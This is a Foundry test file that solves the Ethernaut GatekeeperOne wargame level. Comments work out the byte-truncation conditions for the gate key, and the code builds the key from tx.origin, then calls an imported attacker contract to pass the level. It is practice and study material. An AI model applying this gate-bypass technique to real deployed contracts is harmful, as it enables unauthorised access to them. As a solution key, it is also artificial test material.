// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/13-GatekeeperOne/GatekeeperOneFactory.sol";
import "../src/13-GatekeeperOne/GatekeeperOneAttacker.sol";
import "../src/Ethernaut.sol";

contract GatekeeperOneTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(tx.origin, 5 ether);
    }

    function testGatekeeperOneHack() public {
        // Level setup
        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));

        // Level attack
        // CALCULATIONS:
        // bytes8 key  -> 0x123456789abcdef
        // uint64(key) -> 0x123456789abcdef [same size, only conversion from bytes to uint allowed]
        // uint32(uint64(key)) -> 0x789abcef [32 / 8 -> 4bytes, uint truncates higher-order bits]
        // uint16(uint64(key)) -> 0xbcef [16 / 8 -> 2bytes, uint truncates higher-order bits]
        // tx.origin -> 20bytes
        // uint160(20bytes) -> same size [the only possible conversion]
        // uint16(uint160(20bytes)) -> 2 lower-order bytes [others are truncated]
        // CONCLUSIONS:
        // uint32(uint64(key)) == uint16(uint64(key)) -> bytes 3rd and 4th lower-order bytes are 0
        // uint32(uint64(key)) != uint64(key) -> at least one of the 4 higher-order bytes must not be 0
        // uint32(uint64(key)) == uint16(uint160(tx.origin)) -> 2 lower-order bytes must be equal

        GatekeeperOneAttacker attacker = new GatekeeperOneAttacker(levelAddress);
        bytes8 player2Bytes = bytes8(uint64(uint16(uint160(tx.origin)))); // uint expansion adds 0s on the left
        bytes8 higherBytes = bytes8(bytes1(0x10));  // bytes expansion adds 0s on the right
        bytes8 key = player2Bytes | higherBytes;
        emit log_named_bytes32("Key", bytes32(key));
        attacker.attack(key);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}